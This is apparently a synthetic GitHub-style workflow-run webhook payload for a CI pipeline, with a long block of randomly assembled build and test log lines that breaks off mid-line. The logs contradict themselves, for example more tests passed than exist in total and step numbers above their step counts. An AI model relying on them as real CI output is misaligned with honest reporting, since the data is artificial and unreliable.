{
  "action": "completed",
  "workflow_run": {
    "id": 183,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "60d8c79a0a65b3c3cf948489994925315ae857f4",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-16T12:46:14.139523Z",
    "updated_at": "2025-12-16T12:49:55.548163Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: lint ===\nArtifact downloaded: 25MB\nHEAD is now at 99c372c\nInstalling axios@3.19.8\nnpm notice: package.json updated\nStep 6/21: Installing dependencies\nOptimizing 33 modules...\nImage pulled successfully\nWARNING: webpack has known vulnerabilities\nUploading artifact 'coverage' (9 files)\nReady.\nAlready up to date.\nCoverage: 73% statements, 92% branches\nUsing Python 3.10\nOK\nTest Suites: 36 passed, 25 total\nStep 8/16: Building\nStep 11/24: Linting\n[12:46:14] DEBUG: Connection pool: 17 active\nCompiling components/service.java...\nCoverage: 98% statements, 91% branches\nStep 9/16: Testing\nCreating production build...\n  PASS: integration/test_db_connect.spec.js\nnpm notice: package.json updated\n\u2713 Task completed in 1542ms\nDone.\n[12:46:14] INFO: Cache refreshed\npip: Collecting axios\nCache restored successfully (457MB)\nnpm notice: created a lockfile\nStep 3/20: Building\nOptimizing 40 modules...\nCompiling components/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLayer 10/10: ENV command\nArtifact downloaded: 38MB\nInstalling react@3.18.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nMinifying main.js\nUsing Node.js 19.4.3\nnpm notice: package.json updated\n  PASS: integration/test_auth_login.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: jest has known vulnerabilities\nPlatform: darwin-arm64\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 1/25: Running migrations\nStep 13/20: Linting\nSnapshots: 46 passed, 48 total\nUploading artifact 'coverage' (19 files)\nPOST /data - 202 (33ms)\n  PASS: test_cache_hit (497ms)\nReady.\npip: Downloading prettier-5.3.tar.gz\nStep 11/17: Testing\n  PASS: e2e/test_cache_hit.spec.js\nCache restored successfully (419MB)\nDone.\nHEAD is now at 8940b63\nWaiting...\nPOST /api - 202 (315ms)\nVerifying...\nnpm notice: package.json updated\nArtifact uploaded: dist.zip (68MB)\nFAILED: test_auth_login\nArtifact uploaded: build.tar.gz (39MB)\nCache restored successfully (233MB)\nGenerating source maps...\nArtifact uploaded: build.tar.gz (5MB)\n\u2713 test completed\nChecking out master branch\nSuccess!\n[12:46:14] INFO: Cache refreshed\nUsing Node.js 18.15.4\n[12:46:14] INFO: Connecting to database\nnpm install: resolved 1448 packages\nnpm install: resolved 915 packages\nBundling styles.css\n  PASS: test_db_connect (41ms)\nTime: 67.890s\n[12:46:14] ERROR: Connection failed\nUploading artifact 'build' (5 files)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: package.json updated\npip: Collecting eslint\nCompleted.\nRan 37 tests in 5s\nArtifact uploaded: build.tar.gz (28MB)\npip install: Successfully installed jest-1.6\nVerifying...\nnpm notice: package.json updated\nWARNING: prettier has known vulnerabilities\nnpm install: resolved 1456 packages\nStep 18/16: Deploying\nUploading artifact 'coverage' (39 files)\nCoverage: 72% statements, 63% branches\n  PASS: integration/test_auth_login.spec.js\n[12:46:14] WARN: Deprecated API usage\nCompiling components/app.ts...\nStep 17/16: Linting\nCache restored successfully (300MB)\nDone.\n[12:46:14] DEBUG: Loading configuration\nSwitched to branch 'bugfix/task-852'\n[12:46:14] ERROR: Connection failed\n[12:46:14] DEBUG: Memory usage: 1180MB\nnpm notice: created a lockfile\nTLS handshake completed\n\u2713 Step 'build' succeeded\n[12:46:14] WARN: Deprecated API usage\n[12:46:14] INFO: Cache refreshed\nGET /health - 200 (93ms)\nImage pulled successfully\n[12:46:14] WARN: Deprecated API usage\nLayer 8/12: RUN command\nEnvironment: development\n  PASS: integration/test_user_create.spec.js\n  PASS: test_auth_login (330ms)\n  PASS: test_api_health (180ms)\n[12:46:14] INFO: Connecting to database\n[12:46:14] INFO: Processing request\nCache invalidated: node_modules\n[12:46:14] ERROR: Connection failed\n[12:46:14] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nGenerating source maps...\nWaiting...\nStep 7/23: Building\nTransforming 512 files...\nnpm notice: created a lockfile\nTLS handshake completed\n[12:46:14] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (35MB)\nArtifact uploaded: build.tar.gz (25MB)\n=== Step lint completed ===\n=== Step: save_cache ===\n[12:46:14] INFO: Connecting to database\nArtifact downloaded: 37MB\n[12:46:14] DEBUG: Query executed in 49ms\nException: RuntimeError\nCache saved successfully\nGenerating source maps...\nCompiling lib/app.ts...\nCache miss for key-1068\nArtifact uploaded: dist.zip (33MB)\nFAILED: test_cache_hit\n\u2717 build failed with exit code 120\nInstalling express@2.9.2\nSwitched to branch 'hotfix/task-342'\nCache invalidated: node_modules\nCompiling components/index.js...\n[12:46:14] DEBUG: Query executed in 82ms\n[12:46:14] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:14] DEBUG: Loading configuration\n\u2713 test completed\n[12:46:14] INFO: Cache refreshed\n  PASS: test_auth_login (317ms)\nCompiling utils/main.py...\nUsing Python 3.12\n[12:46:14] DEBUG: Connection pool: 19 active\nOK\n[12:46:14] INFO: Starting build process\nTest Suites: 25 passed, 20 total\nTests: 230 passed, 136 total\nUsing Node.js 14.13.1\nCompiling lib/main.py...\nBuilding Docker image...\nFetching submodules...\nRan 189 tests in 52s\nUsing Node.js 17.3.10\nSuccess!\nnpm install: resolved 1087 packages\nStep 13/18: Installing dependencies\nReady.\nLoading...\nChecking out develop branch\nnpm notice: created a lockfile\npip: Collecting prettier\n[12:46:14] DEBUG: Memory usage: 388MB\n[12:46:14] ERROR: Connection failed\n\u2713 All checks passed\nUploading artifact 'dist' (39 files)\n\u2713 Task completed in 3123ms\nAlready up to date.\nTime: 44.237s\nProcessing...\nSwitched to branch 'bugfix/task-406'\n\u2713 All checks passed\npip: Collecting express\nArtifact uploaded: build.tar.gz (24MB)\nArtifact downloaded: 17MB\nnpm install: added 403 packages\nReady.\nGenerating source maps...\nUsing Node.js 14.13.10\n[12:46:14] DEBUG: Initializing service\nStep 20/24: Building\nTests: 300 passed, 363 total\nPushing to registry...\nPushing to registry...\nStep 2/18: Linting\n[12:46:14] INFO: Connecting to database\nArtifact downloaded: 38MB\nReady.\nStep 12/19: Linting\nTime: 56.120s\nInstalling axios@3.11.0\n\u2713 All checks passed\n[12:46:14] DEBUG: Query executed in 84ms\nnpm notice: package.json updated\nCache miss for key-4893\n[12:46:14] DEBUG: Loading configuration\nWARNING: eslint has known vulnerabilities\n[12:46:14] INFO: Starting build process\nCreating production build...\nUploading artifact 'dist' (41 files)\nCompiling lib/handler.rs...\nHEAD is now at c8b2517\nStep 17/15: Testing\nGenerating source maps...\nCompiling utils/main.py...\n  PASS: test_auth_login (140ms)\nFetching from https://googleapis.com/package.json\nCompiling utils/main.py...\nnpm notice: package.json updated\nRan 95 tests in 38s\n[12:46:14] INFO: Starting build process\n\u2713 Step 'build' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 15/17: Testing\nStep 19/21: Linting\nUploading artifact 'dist' (47 files)\nLoading...\nUsing Node.js 15.1.6\nCompiling components/service.java...\n[12:46:14] DEBUG: Loading configuration\nEnvironment: production\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nLoading...\nRan 149 tests in 59s\nWARNING: jest has known vulnerabilities\nDone.\nTransforming 436 files...\nReady.\nStep 15/15: Linting\nUsing Python 3.11\n\u2713 test completed\n[12:46:14] DEBUG: Connection pool: 5 active\nChecking out master branch\n[12:46:14] INFO: Starting build process\nnpm install: added 174 packages\nnpm notice: package.json updated\n\u2713 build completed\n[12:46:14] INFO: Request completed\nCompleted.\nCompiling components/handler.rs...\nSwitched to branch 'feature/task-970'\nnpm notice: created a lockfile\nCompleted.\nVerifying...\n\u2717 build failed with exit code 46\nConnection established\nyarn add: Done in 10.43s\nCache saved successfully\nVerifying...\n[12:46:14] INFO: Starting build process\nTime: 40.579s\nSuccess!\n=== Step save_cache completed ===\n=== Step: install_dependencies ===\n[12:46:14] INFO: Request completed\nConnection established\nArtifact uploaded: dist.zip (4MB)\n  PASS: test_user_create (236ms)\nCompiling src/utils.go...\n[12:46:14] DEBUG: Query executed in 50ms\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:14] DEBUG: Initializing service\n[12:46:14] INFO: Starting build process\npip: Collecting axios\nRan 25 tests in 16s\nCompiling src/handler.rs...\n[12:46:14] INFO: Cache refreshed\nCache hit for key-9530\n\u2713 Task completed in 1128ms\nHEAD is now at c2677e9\nnpm install: added 188 packages\n[12:46:14] ERROR: Connection failed\n[12:46:14] WARN: Deprecated API usage\n[12:46:14] WARN: Deprecated API usage\nOK\n[12:46:14] INFO: Connecting to database\nStep 2/20: Linting\n  PASS: e2e/test_cache_hit.spec.js\n\u2713 Task completed in 4502ms\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nyarn add: Done in 13.13s\nDone.\npip: Collecting jest\nTransforming 729 files...\nLoading...\n  PASS: integration/test_cache_hit.spec.js\nNODE_ENV=production\nLayer 3/12: COPY command\nnpm notice: created a lockfile\nLoading...\nLoading...\nnpm notice: package.json updated\nTest Suites: 18 passed, 40 total\nFinished.\nEnvironment: development\nStep 17/20: Building\nStep 12/24: Running migrations\nBundling vendor.css\n[12:46:14] INFO: Cache refreshed\nCache miss for key-3868\nEnvironment: test\n  PASS: integration/test_cache_hit.spec.js\nArtifact uploaded: dist.zip (39MB)\nCoverage: 79% statements, 65% branches\nNODE_ENV=test\npip: Collecting prettier\nUsing Python 3.9\nTLS handshake completed\nnpm notice: created a lockfile\n[12:46:14] DEBUG: Initializing service\nStep 14/15: Installing dependencies\nStep 7/19: Linting\nCompiling components/index.js...\nCreating production build...\npip install: Successfully installed lodash-3.17\nGenerating source maps...\n[12:46:14] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTests: 233 passed, 164 total\nArtifact downloaded: 47MB\n\u2713 package completed\nEnvironment: staging\nnpm install: added 235 packages\n[12:46:14] WARN: Deprecated API usage\nConnection established\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nOptimizing 27 modules...\nCache invalidated: node_modules\n[12:46:14] INFO: Connecting to database\nLoading...\nnpm notice: package.json updated\nSwitched to branch 'bugfix/task-590'\nBundling runtime.css\nStep 7/23: Linting\npip: Collecting axios\nCache saved successfully\npip install: Successfully installed lodash-1.7\nStep 1/21: Running migrations\nException: ValueError\nUsing Python 3.12\nOptimizing 12 modules...\nCompleted.\n[12:46:14] INFO: Starting build process\npip: Installing build dependencies...\nnpm install: added 465 packages\nTest Suites: 33 passed, 32 total\nReady.\n[12:46:14] DEBUG: Initializing service\n[12:46:14] DEBUG: Loading configuration\nCompiling utils/index.js...\n[12:46:14] INFO: Processing request\nDone.\n[12:46:14] ERROR: Connection failed\nLoading...\nFetching submodules...\nArtifact downloaded: 32MB\nReady.\nMinifying vendor.js\nPlatform: darwin-arm64\n[12:46:14] INFO: Processing request\n  PASS: test_user_create (52ms)\nOptimizing 36 modules...\n[12:46:14] DEBUG: Initializing service\nCreating production build...\nReady.\nOK\nImage pulled successfully\nStep 4/23: Linting\nOK\nStep 1/21: Linting\nGenerating source maps...\nnpm install: resolved 235 packages\nFAILED: test_user_create\nChecking out master branch\nImage pulled successfully\nTransforming 448 files...\nGET /status - 200 (77ms)\n[12:46:14] INFO: Connecting to database\n[12:46:14] INFO: Request completed\nUsing Node.js 15.10.3\nCompiling utils/app.ts...\nCompiling components/service.java...\n  PASS: test_user_create (80ms)\nStep 1/19: Installing dependencies\n=== Step install_dependencies completed ===\n=== Step: restore_cache ===\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nHEAD is now at 4e05847\nRan 200 tests in 35s\n[12:46:14] DEBUG: Initializing service\nLoading...\nCompiling components/service.java...\nCompiling lib/handler.rs...\nnpm install: added 261 packages\n[12:46:14] INFO: Connecting to database\nWARNING: eslint has known vulnerabilities\nStep 1/25: Building\nInstalling express@5.16.5\nHEAD is now at f8f509b\nOK\n  PASS: test_user_create (87ms)\n[12:46:14] INFO: Request completed\nDone.\nStep 17/17: Deploying\nyarn add: Done in 20.19s\nCompleted.\nnpm install: added 134 packages\nCompiling components/index.js...\nFetching submodules...\nGET /status - 200 (37ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nVerifying...\n\u2713 All checks passed\nTLS handshake completed\nEnvironment: staging\n[12:46:14] INFO: Processing request\nTests: 316 passed, 227 total\nStep 4/22: Building\n[12:46:14] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (6MB)\nStep 1/17: Deploying\n[12:46:14] INFO: Starting build process\nReady.\n[12:46:14] WARN: Deprecated API usage\nUsing Node.js 19.15.9\nReady.\n[12:46:14] INFO: Connecting to database\nCompleted.\nCompiling components/main.py...\nCompiling components/service.java...\nException: ValueError\n\u2713 All checks passed\nFetching from https://docker.io/package.json\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:14] DEBUG: Memory usage: 1321MB\nWARNING: axios has known vulnerabilities\nCompleted.\n[12:46:14] DEBUG: Query executed in 35ms\nFAILED: test_api_health\nArtifact uploaded: build.tar.gz (17MB)\nFinished.\n\u2713 Step 'setup' succeeded\nBuilding Docker image...\n\u2713 Task completed in 4006ms\n\u2713 All checks passed\nTransforming 727 files...\nnpm notice: package.json updated\nOK\n[12:46:14] ERROR: Connection failed\n  PASS: e2e/test_auth_login.spec.js\nCache invalidated: dependencies\nInstalling eslint@5.20.0\n[12:46:14] ERROR: Connection failed\nConnection established\nnpm install: resolved 1414 packages\nPulling image: alpine:3.11\n[12:46:14] INFO: Cache refreshed\nCompleted.\nCache restored successfully (328MB)\nCoverage: 81% statements, 74% branches\n[12:46:14] WARN: Deprecated API usage\nCompiling components/service.java...\nCoverage: 83% statements, 64% branches\nArtifact uploaded: dist.zip (92MB)\nTime: 28.331s\nArtifact downloaded: 6MB\nFetching from https://pypi.org/package.json\n[12:46:14] DEBUG: Query executed in 40ms\n[12:46:14] DEBUG: Initializing service\nCompleted.\n[12:46:14] INFO: Request completed\nnpm notice: package.json updated\nCompiling components/main.py...\nWARNING: webpack has known vulnerabilities\nnpm notice: package.json updated\n[12:46:14] INFO: Request completed\n[12:46:14] INFO: Starting build process\n\u2713 package completed\n[12:46:14] DEBUG: Memory usage: 315MB\nReady.\n[12:46:14] ERROR: Connection failed\nFetching from https://googleapis.com/package.json\nStep 1/25: Linting\nTests: 400 passed, 488 total\nConnection established\npip: Collecting react\nPulling image: python:3.11\nStep 15/20: Testing\nDone.\nStep 2/15: Building\nTLS handshake completed\nCreating production build...\n[12:46:14] DEBUG: Memory usage: 625MB\nTest Suites: 10 passed, 13 total\npip: Downloading prettier-1.17.tar.gz\n[12:46:14] DEBUG: Initializing service\nArtifact downloaded: 32MB\nUsing Node.js 14.16.9\nBundling styles.css\nOK\nMinifying main.js\nArtifact uploaded: dist.zip (11MB)\nCoverage: 79% statements, 77% branches\n[12:46:14] DEBUG: Query executed in 56ms\nHEAD is now at cf3ddf3\nVerifying...\nWARNING: prettier has known vulnerabilities\nBundling vendor.js\nCache restored successfully (269MB)\nCompiling utils/handler.rs...\nPOST /upload - 200 (354ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: dist.zip (46MB)\n[12:46:14] INFO: Connecting to database\npip install: Successfully installed lodash-1.6\nStep 12/18: Deploying\nStep 13/24: Linting\nCache hit for key-4145\n\u2713 Step 'setup' succeeded\nTransforming 195 files...\n=== Step restore_cache completed ===\n=== Step: setup_node ===\n  PASS: e2e/test_user_create.spec.js\nSuccess!\nWARNING: prettier has known vulnerabilities\nCache restored successfully (190MB)\nAlready up to date.\nVerifying...\nVerifying...\nFinished.\n[12:46:14] DEBUG: Connection pool: 18 active\nCompiling utils/app.ts...\nLayer 2/13: COPY command\nCompiling components/handler.rs...\nFetching from https://registry.npmjs.org/package.json\n[12:46:14] INFO: Request completed\nFetching from https://githubusercontent.com/package.json\n[12:46:14] INFO: Request completed\nStep 17/25: Linting\n[12:46:14] INFO: Request completed\npip: Collecting prettier\nReady.\nCompiling lib/handler.rs...\nStep 15/20: Building\nAlready up to date.\nCompiling src/service.java...\nFinished.\n[12:46:14] DEBUG: Loading configuration\nBundling styles.css\nCompiling lib/index.js...\nPOST /upload - 201 (92ms)\nCompiling src/index.js...\nBuilding Docker image...\nChecking out master branch\n[12:46:14] DEBUG: Loading configuration\nyarn add: Done in 17.40s\n[12:46:14] INFO: Cache refreshed\n[12:46:14] WARN: Deprecated API usage\n[12:46:14] DEBUG: Loading configuration\npip: Collecting lodash\nUsing Node.js 15.11.0\n[12:46:14] INFO: Request completed\npip: Installing build dependencies...\n[12:46:14] INFO: Connecting to database\nProcessing...\nFinished.\nImage pulled successfully\nSuccess!\nOptimizing 95 modules...\nException: NullPointerException\nWaiting...\n[12:46:14] DEBUG: Connection pool: 16 active\nBundling runtime.css\nAlready up to date.\nGenerating source maps...\nnpm notice: package.json updated\nArtifact uploaded: build.tar.gz (31MB)\nnpm install: resolved 627 packages\n\u2713 Step 'install' succeeded\n  PASS: test_api_health (388ms)\n[12:46:14] WARN: Deprecated API usage\nCache miss for key-1511\nOptimizing 82 modules...\n[12:46:14] INFO: Processing request\nWaiting...\n\u2717 build failed with exit code 7\n[12:46:14] WARN: Deprecated API usage\n\u2713 All checks passed\n[12:46:14] DEBUG: Initializing service\nnpm install: added 59 packages\n  PASS: unit/test_cache_hit.spec.js\nImage pulled successfully\nException: NullPointerException\nLoading...\nArtifact uploaded: build.tar.gz (34MB)\nSnapshots: 48 passed, 14 total\n[12:46:14] DEBUG: Connection pool: 18 active\nBuilding Docker image...\n[12:46:14] DEBUG: Initializing service\n[12:46:14] DEBUG: Initializing service\nCompiling components/index.js...\nArtifact downloaded: 6MB\nSwitched to branch 'hotfix/task-866'\nStep 13/16: Testing\nyarn add: Done in 26.23s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nMinifying main.js\nLayer 1/14: COPY command\nImage pulled successfully\npip: Installing build dependencies...\nMinifying vendor.js\nLoading...\nStep 2/23: Running migrations\nEnvironment: production\nPulling image: node:18\nUploading artifact 'build' (42 files)\nRan 197 tests in 25s\npip install: Successfully installed express-1.15\n[12:46:14] DEBUG: Connection pool: 13 active\nBundling main.css\nStep 15/16: Linting\nStep 15/23: Deploying\nLayer 10/10: COPY command\nArtifact uploaded: build.tar.gz (17MB)\n[12:46:14] INFO: Connecting to database\nSnapshots: 21 passed, 30 total\n[12:46:14] INFO: Connecting to database\nPulling image: alpine:3.11\npip install: Successfully installed express-5.20\nStep 18/22: Deploying\nUsing Node.js 17.1.1\nnpm install: resolved 1950 packages\nTransforming 449 files...\nTransforming 876 files...\nNODE_ENV=production\n\u2713 All checks passed\nWARNING: eslint has known vulnerabilities\n  PASS: unit/test_auth_login.spec.js\n[12:46:14] INFO: Request completed\nStep 6/19: Running migrations\nStep 11/19: Running migrations\n[12:46:14] WARN: Deprecated API usage\n  PASS: integration/test_db_connect.spec.js\nUsing Node.js 19.5.2\nVerifying...\npip: Collecting react\n[12:46:14] DEBUG: Initializing service\nLoading...\nCache miss for key-9475\nTests: 479 passed, 220 total\nHEAD is now at 4a048cf\nnpm install: resolved 207 packages\n\u2717 build failed with exit code 106\nEnvironment: test\nUsing Node.js 20.2.2\nUsing Python 3.12\n=== Step setup_node completed ===\n=== Step: e2e_tests ===\nLoading...\n[12:46:14] INFO: Processing request\n[12:46:14] DEBUG: Loading configuration\nArtifact downloaded: 19MB\nCreating production build...\nException: NullPointerException\n[12:46:14] WARN: Deprecated API usage\nTransforming 671 files...\nPlatform: darwin-arm64\n[12:46:14] DEBUG: Initializing service\nyarn add: Done in 11.10s\nStep 14/21: Linting\npip: Collecting express\npip: Installing build dependencies...\nnpm notice: package.json updated\nnpm notice: created a lockfile\nProcessing...\nPushing to registry...\nCompiling lib/service.java...\nTests: 481 passed, 434 total\nFetching from https://githubusercontent.com/package.json\nWARNING: express has known vulnerabilities\nOK\nPOST /upload - 202 (210ms)\nGET /api - 201 (90ms)\n[12:46:14] INFO: Processing request\n  PASS: unit/test_auth_login.spec.js\nEnvironment: development\nSwitched to branch 'feature/task-128'\nPushing to registry...\nProcessing...\nLoading...\npip: Downloading eslint-4.4.tar.gz\nFetching submodules...\nTransforming 286 files...\nFetching submodules...\n\u2713 Step 'checkout' succeeded\nUploading artifact 'coverage' (5 files)\nUsing Node.js 20.16.8\n\u2713 All checks passed\nWARNING: jest has known vulnerabilities\npip: Downloading express-3.16.tar.gz\nPulling image: python:18\nCompiling src/app.ts...\nLayer 6/9: COPY command\n[12:46:14] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUsing Node.js 14.11.8\n[12:46:14] INFO: Starting build process\nCache invalidated: build\nBundling runtime.js\n[12:46:14] INFO: Request completed\nArtifact uploaded: build.tar.gz (46MB)\nMinifying app.js\nStep 3/17: Installing dependencies\n[12:46:14] DEBUG: Query executed in 98ms\nCompiling components/utils.go...\n[12:46:14] DEBUG: Loading configuration\nWARNING: axios has known vulnerabilities\nStep 3/16: Linting\nFetching submodules...\nAlready up to date.\nUploading artifact 'dist' (10 files)\nCompiling src/app.ts...\nLoading...\n\u2713 All checks passed\nGET /status - 204 (52ms)\nReady.\nFinished.\nArtifact uploaded: dist.zip (83MB)\nCache miss for key-6706\n[12:46:14] WARN: Deprecated API usage\nTLS handshake completed\npip install: Successfully installed lodash-5.9\nUploading artifact 'coverage' (20 files)\nPlatform: darwin-arm64\nInstalling jest@5.10.5\nnpm notice: package.json updated\nVerifying...\nCache invalidated: build\nCompiling lib/main.py...\n  PASS: test_auth_login (362ms)\nPlatform: darwin-arm64\nAlready up to date.\nTest Suites: 36 passed, 24 total\npip: Installing build dependencies...\nSuccess!\nStep 4/20: Building\nTLS handshake completed\nTest Suites: 6 passed, 24 total\n  PASS: test_cache_hit (403ms)\npip: Downloading express-3.16.tar.gz\n[12:46:14] INFO: Processing request\nCompleted.\nyarn add: Done in 3.58s\nGET /status - 204 (27ms)\npip install: Successfully installed prettier-3.6\n[12:46:14] WARN: Deprecated API usage\nProcessing...\nCache hit for key-5989\n[12:46:14] INFO: Cache refreshed\n\u2717 build failed with exit code 25\nCache miss for key-7483\nReady.\nPlatform: win32-x64\n  PASS: integration/test_api_health.spec.js\nOptimizing 55 modules...\nHEAD is now at 091a8dc\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSwitched to branch 'bugfix/task-436'\n[12:46:14] INFO: Processing request\nUsing Python 3.9\nStep 1/19: Building\npip: Collecting express\n[12:46:14] INFO: Processing request\n[12:46:14] INFO: Connecting to database\npip install: Successfully installed express-2.10\n\u2713 Step 'install' succeeded\nDone.\nFinished.\nWARNING: eslint has known vulnerabilities\nStep 12/17: Testing\nWaiting...\nConnection established\nSuccess!\n[12:46:14] WARN: Deprecated API usage\nOK\nProcessing...\nCache hit for key-4746\nStep 15/23: Testing\n[12:46:14] INFO: Cache refreshed\nCache invalidated: dependencies\nnpm install: added 302 packages\nnpm notice: created a lockfile\n=== Step e2e_tests completed ===\n=== Step: build ===\nArtifact uploaded: build.tar.gz (37MB)\nInstalling jest@3.6.5\nLoading...\nCache miss for key-3067\nCompiling src/handler.rs...\n  PASS: integration/test_auth_login.spec.js\nOptimizing 48 modules...\npip: Collecting react\nImage pulled successfully\nImage pulled successfully\nnpm install: resolved 1067 packages\nConnection established\nGET /health - 200 (14ms)\nPlatform: linux-x64\nNODE_ENV=development\n[12:46:14] DEBUG: Connection pool: 17 active\nCompleted.\nConnection established\nStep 17/17: Running migrations\nnpm install: resolved 1381 packages\nWARNING: eslint has known vulnerabilities\nBuilding Docker image...\nCompleted.\nBuilding Docker image...\nFetching from https://amazonaws.com/package.json\n\u2717 build failed with exit code 126\nConnection established\nChecking out develop branch\n  PASS: e2e/test_api_health.spec.js\nLayer 10/9: COPY command\n[12:46:14] DEBUG: Initializing service\nnpm install: resolved 947 packages\nCache invalidated: build\n[12:46:14] INFO: Cache refreshed\n\u2713 All checks passed\nCompiling utils/main.py...\nLayer 6/13: COPY command\nImage pulled successfully\nSuccess!\nnpm install: added 442 packages\npip: Downloading jest-1.13.tar.gz\nBundling main.css\n[12:46:14] INFO: Cache refreshed\n[12:46:14] WARN: Deprecated API usage\nStep 13/15: Linting\nDone.\nWARNING: express has known vulnerabilities\n[12:46:14] INFO: Cache refreshed\nInstalling jest@4.16.4\n\u2713 Step 'install' succeeded\nCompiling components/service.java...\nCreating production build...\n[12:46:14] DEBUG: Connection pool: 3 active\n[12:46:14] DEBUG: Query executed in 88ms\nCache restored successfully (142MB)\nHEAD is now at 17430df\nTransforming 795 files...\nCache miss for key-6151\nGET /api - 201 (70ms)\nBuilding Docker image...\nCreating production build...\nStep 19/22: Testing\nnpm install: resolved 1286 packages\nCache miss for key-5597\nCache miss for key-2814\nGET /health - 204 (7ms)\nnpm install: added 139 packages\nFAILED: test_auth_login\n[12:46:14] INFO: Starting build process\nOptimizing 67 modules...\nUsing Node.js 20.10.3\nImage pulled successfully\nnpm notice: package.json updated\npip: Collecting webpack\nImage pulled successfully\nCompleted.\n\u2713 All checks passed\n  PASS: test_api_health (450ms)\nWaiting...\nCache miss for key-5173\nSwitched to branch 'bugfix/task-876'\nGET /status - 200 (1ms)\nNODE_ENV=production\nInstalling lodash@4.4.2\nTests: 362 passed, 473 total\n[12:46:14] DEBUG: Memory usage: 1757MB\n\u2713 Task completed in 2580ms\nStep 1/25: Running migrations\n\u2713 All checks passed\nnpm notice: package.json updated\nEnvironment: production\n[12:46:14] DEBUG: Loading configuration\n\u2713 Task completed in 953ms\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSuccess!\n[12:46:14] DEBUG: Memory usage: 989MB\n\u2717 build failed with exit code 52\nBuilding Docker image...\nnpm notice: created a lockfile\nArtifact uploaded: build.tar.gz (18MB)\n[12:46:14] WARN: Deprecated API usage\nRan 124 tests in 7s\nCache restored successfully (466MB)\nHEAD is now at 8e096ec\n\u2713 All checks passed\nLoading...\n\u2713 All checks passed\npip: Downloading jest-5.10.tar.gz\n\u2713 validate completed\nPulling image: node:18\nnpm notice: created a lockfile\nGenerating source maps...\nCache hit for key-2871\nnpm notice: package.json updated\nSwitched to branch 'feature/task-546'\nPulling image: python:18\nTransforming 768 files...\nWARNING: eslint has known vulnerabilities\npip install: Successfully installed jest-1.0\nTime: 120.478s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 17/23: Running migrations\n[12:46:14] INFO: Request completed\nCompleted.\nCache restored successfully (150MB)\nStep 5/25: Testing\nStep 17/16: Testing\nStep 7/24: Linting\nTest Suites: 37 passed, 31 total\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCoverage: 78% statements, 73% branches\nReady.\nStep 9/15: Running migrations\n=== Step build completed ===\n=== Step: setup_environment ===\n[12:46:14] INFO: Connecting to database\nMinifying app.js\nArtifact uploaded: build.tar.gz (37MB)\nStep 1/25: Building\n[12:46:14] DEBUG: Loading configuration\nPOST /data - 201 (324ms)\nnpm notice: package.json updated\nTime: 87.681s\nRan 161 tests in 38s\nHEAD is now at 841ddee\n\u2713 test completed\nHEAD is now at c9e5fa9\nCache saved successfully\nnpm notice: package.json updated\nConnection established\nnpm install: added 204 packages\npip install: Successfully installed react-5.18\nStep 7/21: Linting\nyarn add: Done in 11.65s\npip: Downloading eslint-1.12.tar.gz\nMinifying main.js\nPOST /data - 202 (295ms)\n[12:46:14] INFO: Cache refreshed\n[12:46:14] DEBUG: Loading configuration\npip: Installing build dependencies...\nUsing Node.js 19.14.3\npip: Installing build dependencies...\nRan 80 tests in 44s\nGenerating source maps...\nPlatform: darwin-arm64\nCompiling components/app.ts...\n[12:46:14] WARN: Deprecated API usage\nCache saved successfully\nInstalling eslint@1.16.9\nPlatform: linux-x64\nUploading artifact 'build' (48 files)\n\u2713 All checks passed\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2717 build failed with exit code 72\n[12:46:14] INFO: Starting build process\nCache restored successfully (263MB)\nPulling image: python:latest\nConnection established\n[12:46:14] WARN: Deprecated API usage\nNODE_ENV=development\n[12:46:14] INFO: Starting build process\nDone.\n[12:46:14] ERROR: Connection failed\nTLS handshake completed\nCache hit for key-1717\nnpm install: added 450 packages\nPlatform: win32-x64\nSwitched to branch 'feature/task-106'\nCoverage: 79% statements, 97% branches\n[12:46:14] DEBUG: Memory usage: 1805MB\nWaiting...\nStep 1/22: Installing dependencies\nWaiting...\nTest Suites: 35 passed, 37 total\nConnection established\n  PASS: test_user_create (157ms)\nSnapshots: 7 passed, 16 total\npip install: Successfully installed eslint-3.19\npip: Downloading prettier-2.19.tar.gz\nException: ValueError\nTime: 2.275s\nCache saved successfully\n[12:46:14] DEBUG: Query executed in 13ms\nGenerating source maps...\nTests: 164 passed, 381 total\n[12:46:14] DEBUG: Initializing service\nInstalling axios@3.2.7\nProcessing...\nnpm notice: created a lockfile\nFAILED: test_user_create\nReady.\nCompiling src/utils.go...\nSwitched to branch 'bugfix/task-538'\nChecking out develop branch\nnpm install: resolved 1541 packages\nStep 3/20: Testing\nStep 13/15: Building\nCompiling utils/utils.go...\nCompiling lib/handler.rs...\nCache hit for key-7969\npip install: 